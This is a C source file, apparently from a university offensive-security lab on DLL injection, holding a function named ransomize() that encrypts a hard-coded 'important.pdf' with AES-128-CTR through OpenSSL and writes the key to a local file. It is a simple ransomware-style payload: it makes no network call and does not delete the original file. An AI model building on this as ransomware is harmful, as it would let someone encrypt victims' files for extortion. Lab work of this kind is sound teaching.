#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>

#include <openssl/evp.h>
#include <openssl/rand.h>

#define KEY_SIZE 16
#define IV_SIZE 16

/* Error handler */
void handle_error(const char *msg)
{
    fprintf(stderr, "Error: %s\n", msg);
    exit(EXIT_FAILURE);
}

/* Generate a 16-byte IV for AES-128-CTR: 8-byte nonce + 8-byte counter initialized to 0 */
void make_ctr_iv(unsigned char iv[16])
{
    uint64_t nonce;
    uint64_t counter = 0;

    if (RAND_bytes((unsigned char*)&nonce, sizeof(nonce)) != 1)
        handle_error("RAND_bytes failed for nonce");

    //Convert to big-endian for CTR mode
    for (int i = 0; i < 8; i++) {
        iv[i] = (nonce >> (56 - i * 8)) & 0xFF;
        iv[8 + i] = (counter >> (56 - i * 8)) & 0xFF;
    }
}

/* Save generated key to a .bin file */
int save_key_to_file(const char *path, const unsigned char *key, size_t key_len)
{
    FILE *f = fopen(path, "wb");
    if (!f) return 0;

    if (fwrite(key, 1, key_len, f) != key_len) {
        fclose(f);
        return 0;
    }

    fclose(f);
    return 1;
}

/* Encrypt a file with AES-128-CTR */
int encrypt_file_aes_ctr(const char *source, const char *target)
{
    FILE *infile = fopen(source, "rb");
    if (!infile) handle_error("Cannot open input file");

    FILE *outfile = fopen(target, "wb");
    if (!outfile) {
        fclose(infile);
        handle_error("Cannot open output file");
    }

    unsigned char key[KEY_SIZE];
    unsigned char iv[IV_SIZE];

    // Generate random key and IV 
    if (RAND_bytes(key, KEY_SIZE) != 1) handle_error("RAND_bytes failed for key");
    make_ctr_iv(iv);

    // Write IV at the start of the file
    if (fwrite(iv, 1, IV_SIZE, outfile) != IV_SIZE) handle_error("Failed to write IV");

    // Setup encrpytion context
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) handle_error("Failed to create EVP context");

    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_128_ctr(), NULL, key, iv))
        handle_error("EVP_EncryptInit_ex failed");

    /* ENCRYPTION */
    unsigned char inbuf[4096];
    unsigned char outbuf[4096 + EVP_MAX_BLOCK_LENGTH];
    int outlen;

    size_t nread;
    while ((nread = fread(inbuf, 1, sizeof(inbuf), infile)) > 0) {
        if (1 != EVP_EncryptUpdate(ctx, outbuf, &outlen, inbuf, (int)nread))
            handle_error("EVP_EncryptUpdate failed");
        if (fwrite(outbuf, 1, outlen, outfile) != (size_t)outlen)
            handle_error("Failed to write ciphertext");
    }

    // Finalize
    if (1 != EVP_EncryptFinal_ex(ctx, outbuf, &outlen))
        handle_error("EVP_EncryptFinal_ex failed");
    if (outlen > 0) {
        if (fwrite(outbuf, 1, outlen, outfile) != (size_t)outlen)
            handle_error("Failed to write final block");
    }

    // Cleanup
    EVP_CIPHER_CTX_free(ctx);
    fclose(infile);
    fclose(outfile);

    // Save the key
    if (!save_key_to_file("C:/Users/20231367/OneDrive - TU Eindhoven/Documents/Y3Q2/2IC80 Lab on Offensive Security/dll_injection/aes_key.bin", key, KEY_SIZE)) handle_error("Failed to save key");

    return 0;
}

int ransomize(void)
{
    const char *input_file = "C:/Users/20231367/OneDrive - TU Eindhoven/Documents/Y3Q2/2IC80 Lab on Offensive Security/dll_injection/important.pdf";
    const char *output_file = "C:/Users/20231367/OneDrive - TU Eindhoven/Documents/Y3Q2/2IC80 Lab on Offensive Security/dll_injection/important.enc";

    printf("Encrypting file...\n");
    encrypt_file_aes_ctr(input_file, output_file);
    printf("File encrypted successfully.\n");

    return 0;
}
